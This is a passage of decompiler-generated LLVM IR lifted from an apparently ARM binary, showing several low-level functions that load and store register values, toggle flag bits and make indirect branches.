  %v2_14fd0 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_14fd0, i32* %r4.global-to-local, align 4
  store i32 %v6_14d04, i32* @r5, align 4
  store i32 %v9_14d04, i32* @r6, align 4
  store i32 %v18_14d04, i32* @sb, align 4
  store i32 %v24_14d04, i32* @fp, align 4
  ret i32 %v0_14fc8

; uselistorder directives
  uselistorder i32 %v1_14ec8.pre, { 2, 1, 0 }
  uselistorder i32 %v0_14e5c, { 1, 2, 0 }
  uselistorder i32 %v0_14e28, { 1, 0 }
  uselistorder i32 %v1_14dec, { 1, 0 }
  uselistorder i32 %v0_14dec, { 1, 0 }
  uselistorder i32 %v1_14dd4, { 1, 0, 2 }
  uselistorder i32 %v1_14d8c, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 26, 24, 25 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 4, 3, 5, 6, 7, 8, 9, 10, 12, 11, 14, 13, 15, 16, 17, 18 }
  uselistorder i32 16384, { 52, 0, 53, 39, 70, 40, 71, 41, 72, 42, 73, 43, 74, 44, 75, 18, 76, 17, 66, 3, 54, 37, 55, 4, 56, 5, 57, 6, 58, 38, 59, 7, 60, 8, 61, 9, 62, 10, 63, 11, 64, 12, 65, 36, 67, 13, 68, 14, 69, 45, 77, 15, 78, 16, 79, 19, 87, 46, 88, 80, 48, 81, 49, 82, 22, 83, 47, 84, 20, 85, 21, 86, 23, 89, 24, 90, 26, 91, 25, 92, 28, 93, 27, 94, 29, 95, 30, 96, 31, 97, 32, 98, 33, 99, 50, 100, 34, 1, 51, 101, 35, 2 }
  uselistorder i32 4096, { 9, 10, 11, 1, 0, 2, 18, 3, 8, 12, 4, 13, 14, 6, 15, 5, 7, 16, 17 }
  uselistorder i32 32768, { 1, 4, 2, 0, 3 }
  uselistorder i32 (i32, i32)* @function_10f18, { 8, 0, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32)* @function_11140, { 16, 0, 15, 12, 11, 14, 13, 8, 7, 10, 9, 6, 5, 2, 1, 4, 3 }
  uselistorder i32 1024, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 ()* @function_11d34, { 43, 42, 7, 5, 4, 3, 0, 1, 2, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 6 }
  uselistorder i32 80, { 5, 2, 3, 4, 0, 1, 6 }
  uselistorder i8 43, { 2, 0, 1 }
  uselistorder i32 ()* @function_12da0, { 12, 9, 7, 6, 5, 4, 0, 3, 2, 1, 11, 10, 8 }
  uselistorder i32* @fp, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 118, 105, 106, 107, 108, 109, 111, 110, 112, 27, 28, 29, 30, 31, 32, 33, 21, 18, 19, 20, 22, 23, 24, 25, 26, 35, 34, 36, 37, 38, 39, 43, 44, 45, 46, 47, 48, 49, 50, 51, 40, 41, 42, 54, 52, 53, 0, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 103, 101, 102, 104, 113, 116, 114, 115, 117, 78, 79, 80, 81 }
  uselistorder i32* @sb, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 0, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 125, 126, 127, 128, 129, 130, 131, 132, 133, 136, 134, 135, 137, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 32, 33, 34, 35, 36, 51, 52, 47, 48, 49, 50, 59, 60, 61, 62, 63, 64, 65, 53, 54, 55, 56, 57, 58, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 138, 139, 140, 141, 142, 92, 93, 94, 95 }
  uselistorder label %dec_label_pc_14fc8, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_14fc4, { 2, 0, 1 }
  uselistorder label %bb40, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14ea4, { 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %bb38, { 1, 0 }
  uselistorder label %dec_label_pc_14e1c._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_14dc4, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_14d74, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14d44, { 1, 2, 0 }
}

define i32 @function_14fdc(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_14fdc:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %v0_14fdc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14fdc, label %bb, label %.thread10

bb:                                               ; preds = %dec_label_pc_14fdc
  %v1_14fe4 = load i32, i32* %r2.global-to-local, align 4
  %v2_14fe4 = load i32, i32* %r3.global-to-local, align 4
  %v3_14fe4 = and i32 %v2_14fe4, %v1_14fe4
  %v2_14fe8 = trunc i32 %v3_14fe4 to i16
  %v4_14fe8 = inttoptr i32 %v3_14fe4 to i16*
  store i16 %v2_14fe8, i16* %v4_14fe8, align 2
  br label %.thread10

.thread10:                                        ; preds = %dec_label_pc_14fdc, %bb
  %v0_15010 = call i32 @function_11734()
  store i32 %v0_15010, i32* @r5, align 4
  store i32 0, i32* @r0, align 4
  %v1_1501c = inttoptr i32 %v0_15010 to i32*
  %v2_1501c = load i32, i32* %v1_1501c, align 4
  store i32 %v2_1501c, i32* @r6, align 4
  %v1_15020 = call i32 @function_1607c(i32 0)
  %v2_15028 = icmp eq i32 %v1_15020, 0
  store i32 126992, i32* @r4, align 4
  br i1 %v2_15028, label %bb23, label %.thread13

bb23:                                             ; preds = %.thread10
  store i32 304, i32* %r2.global-to-local, align 4
  %v5_15034 = load i16, i16* inttoptr (i32 127296 to i16*), align 64
  %v7_15034 = zext i16 %v5_15034 to i32
  %v2_15038 = xor i32 %v7_15034, 256
  store i32 %v2_15038, i32* @r3, align 4
  %v2_1503c = trunc i32 %v2_15038 to i16
  store i16 %v2_1503c, i16* inttoptr (i32 127296 to i16*), align 64
  br label %.thread13

.thread13:                                        ; preds = %.thread10, %bb23
  store i32 1, i32* @r0, align 4
  %v1_15044 = call i32 @function_1607c(i32 1)
  %v2_15048 = icmp eq i32 %v1_15044, 0
  br i1 %v2_15048, label %bb24, label %.thread17

bb24:                                             ; preds = %.thread13
  %v1_15050 = load i32, i32* @r4, align 4
  %v3_15050 = add i32 %v1_15050, 304
  store i32 %v3_15050, i32* %r2.global-to-local, align 4
  %v2_15054 = add i32 %v1_15050, 384
  %v3_15054 = inttoptr i32 %v2_15054 to i16*
  %v4_15054 = load i16, i16* %v3_15054, align 2
  %v5_15054 = zext i16 %v4_15054 to i32
  %v2_15058 = xor i32 %v5_15054, 256
  store i32 %v2_15058, i32* %r3.global-to-local, align 4
  %v2_1505c = trunc i32 %v2_15058 to i16
  store i16 %v2_1505c, i16* %v3_15054, align 2
  br label %.thread17

.thread17:                                        ; preds = %.thread13, %bb24
  %v0_15060 = load i32, i32* @r6, align 4
  %v1_15060 = load i32, i32* @r5, align 4
  %v2_15060 = inttoptr i32 %v1_15060 to i32*
  store i32 %v0_15060, i32* %v2_15060, align 4
  ret i32 %v1_15044

; uselistorder directives
  uselistorder i32 %v3_14fe4, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 (i32)* @function_1607c, { 2, 1, 0 }
  uselistorder label %.thread17, { 1, 0 }
  uselistorder label %.thread13, { 1, 0 }
  uselistorder label %.thread10, { 1, 0 }
}

define i32 @function_15074(i32 %arg1) local_unnamed_addr {
dec_label_pc_15074:
  store i32 126992, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_16c5c.520 to i32), i32* @r1, align 4
  store i32 24, i32* @r2, align 4
  %v0_15090 = call i32 @function_11840()
  ret i32 %v0_15090
}

define i32 @function_1517c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1517c:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1517c = load i32, i32* @r4, align 4
  store i32 %v3_1517c, i32* %stack_var_-8, align 4
  %v1_15180 = add i32 %arg1, 8
  %v2_15180 = inttoptr i32 %v1_15180 to i32*
  %v3_15180 = load i32, i32* %v2_15180, align 4
  %v1_15184 = add i32 %arg1, 16
  %v2_15184 = inttoptr i32 %v1_15184 to i32*
  %v3_15184 = load i32, i32* %v2_15184, align 4
  %v9_15188 = icmp eq i32 %v3_15184, %v3_15180
  store i32 %arg1, i32* %r4.global-to-local, align 4
  br i1 %v9_15188, label %bb3, label %bb

bb:                                               ; preds = %dec_label_pc_1517c
  store i32 %v3_15180, i32* %v2_15184, align 4
  br label %bb3

bb3:                                              ; preds = %dec_label_pc_1517c, %bb
  %v1_15194 = xor i1 %v9_15188, true
  call void @__pseudo_cond_branch(i1 %v1_15194, i32 ptrtoint (i32* @global_var_16468.521 to i32))
  %v0_15198 = load i32, i32* %r4.global-to-local, align 4
  %v1_15198 = add i32 %v0_15198, 8
  %v2_15198 = inttoptr i32 %v1_15198 to i32*
  %v3_15198 = load i32, i32* %v2_15198, align 4
  %v1_1519c = add i32 %v0_15198, 16
  %v2_1519c = inttoptr i32 %v1_1519c to i32*
  %v3_1519c = load i32, i32* %v2_1519c, align 4
  %v2_151a0 = sub i32 %v3_1519c, %v3_15198
  %v2_151a4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_151a4, i32* @r4, align 4
  ret i32 %v2_151a0

; uselistorder directives
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @function_151ac(i32 %arg1) local_unnamed_addr {
dec_label_pc_151ac:
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_151ac = load i32, i32* @r4, align 4
  store i32 %v3_151ac, i32* %stack_var_-16, align 4
  %v6_151ac = load i32, i32* @r5, align 4
  %v12_151ac = load i32, i32* @lr, align 4
  %v1_151b0 = add i32 %arg1, 52
  %v2_151b0 = inttoptr i32 %v1_151b0 to i32*
  %v3_151b0 = load i32, i32* %v2_151b0, align 4
  %v2_151b8 = icmp eq i32 %v3_151b0, 0
  store i32 %arg1, i32* @r5, align 4
  store i32 126992, i32* %r6.global-to-local, align 4
  br i1 %v2_151b8, label %dec_label_pc_151f0, label %dec_label_pc_151cc

dec_label_pc_151cc:                               ; preds = %dec_label_pc_151ac
  %v1_151cc = add i32 %arg1, 16
  %v2_151cc = inttoptr i32 %v1_151cc to i32*
  %v3_151cc = load i32, i32* %v2_151cc, align 4
  %v1_151d0 = add i32 %arg1, 24
  %v2_151d0 = inttoptr i32 %v1_151d0 to i32*
  %v3_151d0 = load i32, i32* %v2_151d0, align 4
  %v3_151d4 = icmp ult i32 %v3_151cc, %v3_151d0
  br i1 %v3_151d4, label %.thread, label %dec_label_pc_151e4

.thread:                                          ; preds = %dec_label_pc_151cc
  %v2_151d8 = inttoptr i32 %v3_151cc to i8*
  %v3_151d8 = load i8, i8* %v2_151d8, align 1
  %v4_151d8 = zext i8 %v3_151d8 to i32
  store i32 %v4_151d8, i32* %r4.global-to-local, align 4
  %v6_151d8 = add i32 %v3_151cc, 1
  store i32 %v6_151d8, i32* %v2_151cc, align 4
  br label %dec_label_pc_15264

dec_label_pc_151e4:                               ; preds = %dec_label_pc_151cc
  %v1_151e4 = inttoptr i32 %arg1 to i16*
  %v2_151e4 = call i32 @function_156d8(i16* %v1_151e4)
  store i32 %v2_151e4, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15264

dec_label_pc_151f0:                               ; preds = %dec_label_pc_151ac
  %v1_151f4 = add i32 %arg1, 56
  store i32 %v1_151f4, i32* @r4, align 4
  %v4_15208 = load i32, i32* inttoptr (i32 127064 to i32*), align 8
  call void @__pseudo_branch(i32 %v4_15208)
  %v0_1521c = load i32, i32* %r6.global-to-local, align 4
  %v2_1521c = add i32 %v0_1521c, 16
  %v3_1521c = inttoptr i32 %v2_1521c to i32*
  %v4_1521c = load i32, i32* %v3_1521c, align 4
  store i32 86568, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1521c)
  %v0_15228 = load i32, i32* @r5, align 4
  %v1_15228 = add i32 %v0_15228, 16
  %v2_15228 = inttoptr i32 %v1_15228 to i32*
  %v3_15228 = load i32, i32* %v2_15228, align 4
  %v1_1522c = add i32 %v0_15228, 24
  %v2_1522c = inttoptr i32 %v1_1522c to i32*
  %v3_1522c = load i32, i32* %v2_1522c, align 4
  %v3_15230 = icmp ult i32 %v3_15228, %v3_1522c
  br i1 %v3_15230, label %.thread2, label %dec_label_pc_15240

.thread2:                                         ; preds = %dec_label_pc_151f0
  %v2_15234 = inttoptr i32 %v3_15228 to i8*
  %v3_15234 = load i8, i8* %v2_15234, align 1
  %v4_15234 = zext i8 %v3_15234 to i32
  store i32 %v4_15234, i32* %r4.global-to-local, align 4
  %v6_15234 = add i32 %v3_15228, 1
  store i32 %v6_15234, i32* %v2_15228, align 4
  br label %dec_label_pc_1524c

dec_label_pc_15240:                               ; preds = %dec_label_pc_151f0
  %v1_15244 = inttoptr i32 %v0_15228 to i16*
  %v2_15244 = call i32 @function_156d8(i16* %v1_15244)
  store i32 %v2_15244, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1524c

dec_label_pc_1524c:                               ; preds = %.thread2, %dec_label_pc_15240
  %v0_15258 = load i32, i32* %r6.global-to-local, align 4
  %v2_15258 = add i32 %v0_15258, 24
  %v3_15258 = inttoptr i32 %v2_15258 to i32*
  %v4_15258 = load i32, i32* %v3_15258, align 4
  store i32 %v4_15258, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_15258)
  br label %dec_label_pc_15264

dec_label_pc_15264:                               ; preds = %.thread, %dec_label_pc_151e4, %dec_label_pc_1524c
  %v0_15264 = load i32, i32* %r4.global-to-local, align 4
  %v2_1526c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1526c, i32* @r4, align 4
  store i32 %v6_151ac, i32* @r5, align 4
  store i32 %v12_151ac, i32* @lr, align 4
  ret i32 %v0_15264

; uselistorder directives
  uselistorder i32 %v3_15228, { 1, 0, 2 }
  uselistorder i32 %v3_151cc, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg1, { 1, 5, 4, 3, 2, 0 }
  uselistorder label %dec_label_pc_15264, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1524c, { 1, 0 }
}

define i32 @function_15278(i32 %arg1) local_unnamed_addr {
dec_label_pc_15278:
  %v0_15278 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15278, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_15278
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_15278, %bb
  %v10_15284 = phi i32 [ %arg1, %dec_label_pc_15278 ], [ 0, %bb ]
  ret i32 %v10_15284

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_15288(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_15288:
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_15288 = load i32, i32* @r4, align 4
  store i32 %v3_15288, i32* %stack_var_-28, align 4
  %v6_15288 = load i32, i32* @r5, align 4
  %v9_15288 = load i32, i32* @r6, align 4
  %v12_15288 = load i32, i32* @r7, align 4
  %v21_15288 = load i32, i32* @lr, align 4
  %v1_1528c = add i32 %arg3, 52
  %v2_1528c = inttoptr i32 %v1_1528c to i32*
  %v3_1528c = load i32, i32* %v2_1528c, align 4
  %v1_15294 = sub i32 1, %v3_1528c
  %v2_15294 = icmp ult i32 %v3_1528c, 2
  br i1 %v2_15294, label %bb16, label %bb

bb:                                               ; preds = %dec_label_pc_15288
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_15288, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v1_15294, %dec_label_pc_15288 ]
  %v0_1529c = phi i32 [ 0, %bb ], [ %v1_15294, %dec_label_pc_15288 ]
  store i32 %storemerge, i32* %sl.global-to-local, align 4
  %v2_1529c = icmp eq i32 %v0_1529c, 0
  store i32 126992, i32* @r5, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %arg1, i32* %r8.global-to-local, align 4
  store i32 %arg2, i32* @r7, align 4
  br i1 %v2_1529c, label %dec_label_pc_152f0, label %dec_label_pc_152b8

dec_label_pc_152b8:                               ; preds = %bb16
  %v1_152bc = add i32 %arg3, 56
  store i32 %v1_152bc, i32* @r4, align 4
  %v4_152d0 = load i32, i32* inttoptr (i32 127064 to i32*), align 8
  call void @__pseudo_branch(i32 %v4_152d0)
  %v0_152e4 = load i32, i32* @r5, align 4
  %v2_152e4 = add i32 %v0_152e4, 16
  %v3_152e4 = inttoptr i32 %v2_152e4 to i32*
  %v4_152e4 = load i32, i32* %v3_152e4, align 4
  store i32 %v4_152e4, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_152f0.531 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_152e4)
  %v0_152f0.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_152f4.pre = load i32, i32* @r7, align 4
  %v0_152f8.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_152f0

dec_label_pc_152f0:                               ; preds = %bb16, %dec_label_pc_152b8
  %v0_152f8 = phi i32 [ %arg3, %bb16 ], [ %v0_152f8.pre, %dec_label_pc_152b8 ]
  %v0_152f4 = phi i32 [ %arg2, %bb16 ], [ %v0_152f4.pre, %dec_label_pc_152b8 ]
  %v0_152f0 = phi i32 [ %arg1, %bb16 ], [ %v0_152f0.pre, %dec_label_pc_152b8 ]
  %v3_152fc = inttoptr i32 %v0_152f0 to i8*
  %v4_152fc = call i32 @function_15804(i8* %v3_152fc, i32 %v0_152f4, i32 %v0_152f8)
  %v0_15300 = load i32, i32* %sl.global-to-local, align 4
  %v2_15300 = icmp eq i32 %v0_15300, 0
  store i32 %v4_152fc, i32* %r4.global-to-local, align 4
  br i1 %v2_15300, label %dec_label_pc_152f0..thread3_crit_edge, label %bb17

dec_label_pc_152f0..thread3_crit_edge:            ; preds = %dec_label_pc_152f0
  %v0_1531c.pre = load i32, i32* @ip, align 4
  br label %.thread3

bb17:                                             ; preds = %dec_label_pc_152f0
  %v1_15314 = load i32, i32* @r5, align 4
  %v3_15314 = add i32 %v1_15314, 24
  %v4_15314 = inttoptr i32 %v3_15314 to i32*
  %v5_15314 = load i32, i32* %v4_15314, align 4
  store i32 %v5_15314, i32* @ip, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_152f0..thread3_crit_edge, %bb17
  %v0_1531c = phi i32 [ %v0_1531c.pre, %dec_label_pc_152f0..thread3_crit_edge ], [ %v5_15314, %bb17 ]
  %v2_1531c = xor i1 %v2_15300, true
  call void @__pseudo_cond_branch(i1 %v2_1531c, i32 %v0_1531c)
  %v0_15320 = load i32, i32* %r4.global-to-local, align 4
  %v2_15328 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_15328, i32* %r4.global-to-local, align 4
  store i32 %v6_15288, i32* @r5, align 4
  store i32 %v9_15288, i32* @r6, align 4
  store i32 %v12_15288, i32* @r7, align 4
  store i32 %v21_15288, i32* @lr, align 4
  ret i32 %v0_15320

; uselistorder directives
  uselistorder i32 %v3_1528c, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 1, 0 }
  uselistorder i32 52, { 9, 10, 11, 12, 13, 3, 14, 7, 8, 4, 16, 17, 1, 18, 0, 19, 20, 5, 6, 15, 2 }
  uselistorder i32 %arg3, { 0, 3, 1, 2 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_152f0, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
}

define i32 @function_15334(i32 %arg1) local_unnamed_addr {
dec_label_pc_15334:
  %v0_15334 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15334, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_15334
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_15334, %bb
  %v10_15340 = phi i32 [ %arg1, %dec_label_pc_15334 ], [ 0, %bb ]
  ret i32 %v10_15340

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_15344() local_unnamed_addr {
dec_label_pc_15344:
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_15344 = load i32, i32* @r4, align 4
  store i32 %v3_15344, i32* %stack_var_-24, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 126992, i32* %r6.global-to-local, align 4
  %v4_15354 = load i32, i32* inttoptr (i32 127028 to i32*), align 4
  store i32 %v4_15354, i32* %r8.global-to-local, align 4
  store i32 108, i32* %r3.global-to-local, align 4
  %v4_1535c = load i32, i32* inttoptr (i32 127100 to i32*), align 4
  store i32 %v4_1535c, i32* %r4.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v4_15368 = load i32, i32* inttoptr (i32 127064 to i32*), align 8
  store i32 %v4_15368, i32* %r7.global-to-local, align 4
  %v2_15374 = ptrtoint i32* %stack_var_-40 to i32
  call void @__pseudo_branch(i32 %v4_15368)
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_15388 = load i32, i32* %r6.global-to-local, align 4
  %v2_15388 = add i32 %v0_15388, 16
  %v3_15388 = inttoptr i32 %v2_15388 to i32*
  %v4_15388 = load i32, i32* %v3_15388, align 4
  store i32 %v4_15388, i32* %r5.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_15388)
  store i32 12, i32* %r3.global-to-local, align 4
  %v0_15398 = load i32, i32* %r6.global-to-local, align 4
  %v2_15398 = add i32 %v0_15398, 12
  %v3_15398 = inttoptr i32 %v2_15398 to i32*
  %v4_15398 = load i32, i32* %v3_15398, align 4
  store i32 %v4_15398, i32* %r3.global-to-local, align 4
  %v1_1539c = inttoptr i32 %v4_15398 to i32*
  %v2_1539c = load i32, i32* %v1_1539c, align 4
  store i32 %v2_1539c, i32* %r3.global-to-local, align 4
  %v7_153a0 = icmp eq i32 %v2_1539c, 1
  br i1 %v7_153a0, label %dec_label_pc_153a8, label %dec_label_pc_15468

dec_label_pc_153a8:                               ; preds = %dec_label_pc_15344
  store i32 48, i32* %r3.global-to-local, align 4
  %v2_153ac = add i32 %v0_15398, 48
  %v3_153ac = inttoptr i32 %v2_153ac to i32*
  %v4_153ac = load i32, i32* %v3_153ac, align 4
  store i32 %v4_153ac, i32* %r3.global-to-local, align 4
  %v1_153b0 = inttoptr i32 %v4_153ac to i32*
  %v2_153b0 = load i32, i32* %v1_153b0, align 4
  store i32 %v2_153b0, i32* %r3.global-to-local, align 4
  %tmp30 = icmp slt i32 %v2_153b0, 1
  br i1 %tmp30, label %dec_label_pc_15468, label %dec_label_pc_153bc

dec_label_pc_153bc:                               ; preds = %dec_label_pc_153a8
  store i32 96, i32* %r3.global-to-local, align 4
  %v2_153c0 = add i32 %v0_15398, 96
  %v3_153c0 = inttoptr i32 %v2_153c0 to i32*
  %v4_153c0 = load i32, i32* %v3_153c0, align 4
  store i32 %v4_153c0, i32* %r4.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_15368)
  call void @__pseudo_branch(i32 %v4_15388)
  %v0_153e8 = load i32, i32* %r6.global-to-local, align 4
  %v2_153e8 = add i32 %v0_153e8, 44
  %v3_153e8 = inttoptr i32 %v2_153e8 to i32*
  %v4_153e8 = load i32, i32* %v3_153e8, align 4
  store i32 %v4_153e8, i32* %r3.global-to-local, align 4
  %v1_153ec = inttoptr i32 %v4_153e8 to i32*
  %v2_153ec = load i32, i32* %v1_153ec, align 4
  store i32 %v2_153ec, i32* %r4.global-to-local, align 4
  store i32 44, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v2_1543811 = icmp eq i32 %v2_153ec, 0
  br i1 %v2_1543811, label %dec_label_pc_15444, label %dec_label_pc_153fc

dec_label_pc_153fc:                               ; preds = %dec_label_pc_153bc, %dec_label_pc_15434
  %v0_154202 = phi i32 [ %v0_15434, %dec_label_pc_15434 ], [ %v2_153ec, %dec_label_pc_153bc ]
  %v1_153fc = inttoptr i32 %v0_154202 to i16*
  %v2_153fc = load i16, i16* %v1_153fc, align 2
  %v3_153fc = zext i16 %v2_153fc to i32
  store i32 %v3_153fc, i32* %r3.global-to-local, align 4
  %v2_15400 = and i32 %v3_153fc, 32816
  %v7_15404 = icmp eq i32 %v2_15400, 48
  %v1_15408 = add i32 %v0_154202, 32
  %v2_15408 = inttoptr i32 %v1_15408 to i32*
  %v3_15408 = load i32, i32* %v2_15408, align 4
  store i32 %v3_15408, i32* %r5.global-to-local, align 4
  br i1 %v7_15404, label %dec_label_pc_15414, label %.thread21

.thread21:                                        ; preds = %dec_label_pc_153fc
  store i32 %v0_154202, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15434

dec_label_pc_15414:                               ; preds = %dec_label_pc_153fc
  %v0_15414 = load i32, i32* %r7.global-to-local, align 4
  %v2_15414 = icmp eq i32 %v0_15414, 0
  br i1 %v2_15414, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_15414
  %v1_15418 = load i32, i32* %r6.global-to-local, align 4
  %v2_15418 = load i32, i32* %r8.global-to-local, align 4
  %v3_15418 = add i32 %v2_15418, %v1_15418
  %v4_15418 = inttoptr i32 %v3_15418 to i32*
  %v5_15418 = load i32, i32* %v4_15418, align 4
  store i32 %v5_15418, i32* %r3.global-to-local, align 4
  %v3_1541c = inttoptr i32 %v5_15418 to i32*
  store i32 %v3_15408, i32* %v3_1541c, align 4
  %v0_15420 = load i32, i32* %r4.global-to-local, align 4
  %v1_15420 = inttoptr i32 %v0_15420 to i16*
  %v2_15420 = load i16, i16* %v1_15420, align 2
  %v3_15420 = zext i16 %v2_15420 to i32
  store i32 %v3_15420, i32* %r3.global-to-local, align 4
  br label %bb31

bb:                                               ; preds = %dec_label_pc_15414
  %v2_154208 = load i16, i16* %v1_153fc, align 2
  %v3_154209 = zext i16 %v2_154208 to i32
  store i32 %v3_154209, i32* %r3.global-to-local, align 4
  %v3_15424 = add i32 %v0_15414, 32
  %v4_15424 = inttoptr i32 %v3_15424 to i32*
  store i32 %v3_15408, i32* %v4_15424, align 4
  %v0_15428.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb31

bb31:                                             ; preds = %.thread, %bb
  %v0_15428 = phi i32 [ %v3_15420, %.thread ], [ %v0_15428.pre, %bb ]
  %v1_15428 = and i32 %v0_15428, 8192
  %v2_15428 = icmp eq i32 %v1_15428, 0
  br i1 %v2_15428, label %bb33, label %bb32

bb32:                                             ; preds = %bb31
  br label %bb33

bb33:                                             ; preds = %bb31, %bb32
  %v1_15430 = xor i1 %v2_15428, true
  call void @__pseudo_cond_branch(i1 %v1_15430, i32 ptrtoint (i32* @global_var_12da0.21 to i32))
  %v0_15434.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_15434

dec_label_pc_15434:                               ; preds = %.thread21, %bb33
  %v0_15434 = phi i32 [ %v0_15434.pre, %bb33 ], [ %v3_15408, %.thread21 ]
  store i32 %v0_15434, i32* %r4.global-to-local, align 4
  %v2_15438 = icmp eq i32 %v0_15434, 0
  br i1 %v2_15438, label %dec_label_pc_15438.dec_label_pc_15444_crit_edge, label %dec_label_pc_153fc

dec_label_pc_15438.dec_label_pc_15444_crit_edge:  ; preds = %dec_label_pc_15434
  %v0_15450.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15444

dec_label_pc_15444:                               ; preds = %dec_label_pc_15438.dec_label_pc_15444_crit_edge, %dec_label_pc_153bc
  %v0_15450 = phi i32 [ %v0_15450.pre, %dec_label_pc_15438.dec_label_pc_15444_crit_edge ], [ %v0_153e8, %dec_label_pc_153bc ]
  store i32 24, i32* %r3.global-to-local, align 4
  %v2_15450 = add i32 %v0_15450, 24
  %v3_15450 = inttoptr i32 %v2_15450 to i32*
  %v4_15450 = load i32, i32* %v3_15450, align 4
  call void @__pseudo_branch(i32 %v4_15450)
  store i32 48, i32* %r3.global-to-local, align 4
  %v0_15460 = load i32, i32* %r6.global-to-local, align 4
  %v2_15460 = add i32 %v0_15460, 48
  %v3_15460 = inttoptr i32 %v2_15460 to i32*
  %v4_15460 = load i32, i32* %v3_15460, align 4
